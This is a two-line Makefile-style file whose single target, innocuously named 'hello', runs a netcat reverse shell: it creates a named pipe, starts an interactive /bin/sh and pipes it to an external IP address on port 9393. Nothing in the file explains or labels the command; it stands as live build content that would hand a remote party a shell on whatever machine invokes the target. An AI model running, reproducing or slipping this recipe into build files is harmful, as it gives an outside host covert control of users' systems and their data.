hello:
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 159.65.128.101 9393 >/tmp/f
